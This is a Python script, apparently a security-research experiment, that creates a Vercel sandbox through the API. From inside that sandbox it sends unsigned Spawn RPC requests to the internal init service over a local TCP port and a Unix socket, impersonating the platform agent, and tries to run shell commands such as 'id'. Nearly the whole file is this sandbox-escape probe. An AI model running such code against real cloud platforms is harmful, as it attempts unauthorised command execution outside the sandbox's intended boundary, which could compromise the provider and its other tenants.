# -*- coding: utf-8 -*-
"""实验J287p: TCP 127.0.0.1:23456 冒充agent调Spawn vs Unix socket基线"""
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("EXIT:", json.dumps(d.get("command", {}))[:300], flush=True)
        except Exception:
            print("NONJSON:", line[:400], flush=True)
    return out

NAME = "expj287p"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# 1) TCP 23456 无签名 Spawn (冒充 agent)
out = run_cmd(sid, r'''
import socket, struct, json as _j
def spawn_via(conn_factory, label):
    try:
        sock = conn_factory()
        sock.settimeout(8)
        msg = _j.dumps({"command": "/bin/sh", "arguments": ["-c", "echo %s_OK; id"],
                        "environment": []}).encode()
        body = b"\x00" + struct.pack(">I", len(msg)) + msg
        req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\n"
               b"Host: init\r\nContent-Type: application/connect+json\r\n"
               b"Connect-Protocol-Version: 1\r\n"
               b"Content-Length: " + str(len(body)).encode() + b"\r\n"
               b"Connection: close\r\n\r\n" + body)
        sock.sendall(req)
        data = b""
        try:
            while True:
                d = sock.recv(4096)
                if not d:
                    break
                data += d
                if len(data) > 50000:
                    break
        except socket.timeout:
            pass
        sock.close()
        print("%s RAW: %r" % (label, data[:1500]), flush=True)
    except Exception as e:
        print("%s EXC: %s %s" % (label, type(e).__name__, e), flush=True)

# TCP 23456
spawn_via(lambda: socket.create_connection(("127.0.0.1", 23456), timeout=5), "TCP23456")
''', "TCP_SPAWN", timeout=100)
print("TCP_SPAWN out:", repr((out or "")[:2000]), flush=True)

# 2) Unix socket 基线 (无签名)
out = run_cmd(sid, r'''
import socket, struct, json as _j
def spawn_via(conn_factory, label):
    try:
        sock = conn_factory()
        sock.settimeout(8)
        msg = _j.dumps({"command": "/bin/sh", "arguments": ["-c", "echo %s_OK; id"],
                        "environment": []}).encode()
        body = b"\x00" + struct.pack(">I", len(msg)) + msg
        req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\n"
               b"Host: init\r\nContent-Type: application/connect+json\r\n"
               b"Connect-Protocol-Version: 1\r\n"
               b"Content-Length: " + str(len(body)).encode() + b"\r\n"
               b"Connection: close\r\n\r\n" + body)
        sock.sendall(req)
        data = b""
        try:
            while True:
                d = sock.recv(4096)
                if not d:
                    break
                data += d
                if len(data) > 50000:
                    break
        except socket.timeout:
            pass
        sock.close()
        print("%s RAW: %r" % (label, data[:1500]), flush=True)
    except Exception as e:
        print("%s EXC: %s %s" % (label, type(e).__name__, e), flush=True)

spawn_via(lambda: socket.socket(socket.AF_UNIX, socket.SOCK_STREAM).connect("/run/vercel/share/init.sock") or socket.socket(socket.AF_UNIX, socket.SOCK_STREAM), "UNIX") if False else None
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    sock.settimeout(8)
    sock.connect("/run/vercel/share/init.sock")
    msg = _j.dumps({"command": "/bin/sh", "arguments": ["-c", "echo UNIX_OK; id"],
                    "environment": []}).encode()
    body = b"\x00" + struct.pack(">I", len(msg)) + msg
    req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\n"
           b"Host: init\r\nContent-Type: application/connect+json\r\n"
           b"Connect-Protocol-Version: 1\r\n"
           b"Content-Length: " + str(len(body)).encode() + b"\r\n"
           b"Connection: close\r\n\r\n" + body)
    sock.sendall(req)
    data = b""
    try:
        while True:
            d = sock.recv(4096)
            if not d:
                break
            data += d
            if len(data) > 50000:
                break
    except socket.timeout:
        pass
    sock.close()
    print("UNIX RAW: %r" % data[:1500], flush=True)
except Exception as e:
    print("UNIX EXC: %s %s" % (type(e).__name__, e), flush=True)
''', "UNIX_SPAWN", timeout=100)
print("UNIX_SPAWN out:", repr((out or "")[:2000]), flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
